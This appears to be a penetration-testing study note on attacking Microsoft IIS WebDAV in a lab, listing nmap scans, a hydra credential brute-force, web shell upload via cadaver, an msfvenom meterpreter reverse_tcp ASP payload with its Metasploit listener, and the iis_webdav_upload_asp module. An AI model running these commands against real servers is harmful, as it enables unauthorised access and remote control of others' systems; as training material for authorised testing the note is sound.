# Exploiting Microsoft IIS WebDAV
- Microsoft IIS - web server software developed by Microsoft
- Supported executable file extensions - .asp .aspx .config .php

#### WebDAV
- a set of extensions to the HTTP protocol - enables a web server to function as a file server
- uses a pair of username and password for authentication 
#### WebDAV Exploitation:
- Process
	- First, identifying whether WebDAV has been configured to run on the IIS web server
	- Second, perform a brute force to identify legitimate credentials
	- Third, after obtaining legitimate credentials, we can authenticate with WebDAV and upload a malicious .asp payload that will execute arbitrary commands 
- Tools 
	- davtest - scan, authenticate and exploit a WebDAV server
	- cadaver - supports file upload, download, on-screen display, in-place editing, ...
- `$ nmap -sV -sC 10.10.10.10`
- `$ nmap -sV -p 80 --script=http-enum 10.10.10.10`
- for authintication brute-force --> `$ hydra -L <path to username list> -P <path to pass list> 10.10.10.10 http-get /webdav/`
- davtest 
	- `$ davtest -url http://10.10.10.10/webdav`
	- `$ davtest -auth bob: password -url http://10.10.10.10/webdav`
- cadaver
	- `$ cadaver http://10.10.10.10/webdav`
	- once inside, run commands like ls
	- Kali has some preexisted web shells that can be accessed in `/usr/share/webshells/` - that can be used 
	- upload a webshell -- put `/usr/share/webshells/asp/webshell.asp`
	- run the webshell on your browser and execute your commands
- with Metasploit
	- First technique - Manual
		- msfvenome 
		- obtain meterpreter shell
		- generate asp payload
		- `$ msfvenom -p windows/meterpreter/reverse_tcp LHOST= your ip LPORT=port on your sys(1234) -f asp > meterpreter.asp`
		- connect using cadaver
		- upload the file you generated - put `/root/meterpreter.asp`
		- before opening the file on the browser, start a listener
		- `$ service postgresql start && msfconsole``
		- `$ use multi/handler/`
		- `$ set payload windows/meterpreter/reverse_tcp`
		- `$ set lhost <your ip>`
		- `$ set lport 1234`
		- `$ run`
		- when the file is executed on the target, we will gain access to our MSF console tab
	- Second technique - Automated - Recommended
		- use a Metasploit module
		- Search IIS upload
		- use `/exploit/windows/iis/iis_webdav_upload_asp`
		- set the options
		- run
